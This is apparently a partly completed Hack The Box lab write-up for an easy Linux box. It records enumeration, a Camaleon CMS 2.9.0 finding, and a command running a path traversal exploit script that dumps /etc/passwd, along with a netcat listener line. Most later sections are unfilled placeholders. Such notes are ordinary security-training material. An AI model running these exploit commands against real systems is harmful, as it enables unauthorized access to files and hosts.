# Facts

**Platform**: HTB\
**Difficulty**: Easy\
**Date**: 2026-05-30\
**OS**: Linux\
**IP**: 10.129.244.96

# Enumeration

## Nmap

```bash
nmap -sC -sV $IP -oN recon/initial
```

#### Findings
* Port 22 ssh (OpenSSH 9.9p1)
* Port 80 nginx

```text
output
```

---

## Web Enumeration

### Directories

```bash
gobuster dir -u $IP -w /usr/share/wordlists/...
```

#### Findings

* /admin
* /search

```text
output
```

Notes:
- recurring users in website comments (Bob, Carol, Dave)
- admin portal:
 - attempted admin:admin, returns "incorrect user or pass"
 - created user acct and accessed admin panel: test:t3st-
 - camaleon CMS version 2.9.0

---

# Initial Foothold

## Vulnerability

Describe briefly.

Camaleon CMS version 2.9.0 vulnerable to:
CVE-2025–2304 - Authenticated Privilege Escalation (Role Change) + Optional S3 Config Leak
CVE-2024-46987 - Path Traversal / LFI


## Exploit

```bash
python CVE-2024-46987.py -u http://facts.htb -l test -p t3st- /etc/passwd
```

Output
```bash
[*] Récupération du token sur http://facts.htb/admin/login
[*] Authentification réussie.
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin
pollinate:x:103:1::/var/cache/pollinate:/bin/false
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin
syslog:x:104:104::/nonexistent:/usr/sbin/nologin
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
_laurel:x:101:988::/var/log/laurel:/bin/false
```
Notes:
* identified users in `/etc/passwd': trivia, william
* 500 error when reading /etc/shadow



## Shell

```bash
nc -lvnp 4444
```

---

# Privilege Escalation

## Enumeration

```bash
whoami
linpeas.sh
sudo -l
```

## Findings

* Writable service
* SUID binary

## Exploit

```bash
/path/to/exploit
```

---

# Flags

#### User
```text
flag_here
```

#### Root/Admin
```text
flag_here
```

---

# Lessons Learned

**Key takeaway**:
* identified potential vulnerabilities, but referred to writeup instead of validating theory and gaining initial foothold
* research vulnerabilities thoroughly
**Enumeration lesson**:\
**Missed clues**:\
**New/Useful Commands**:
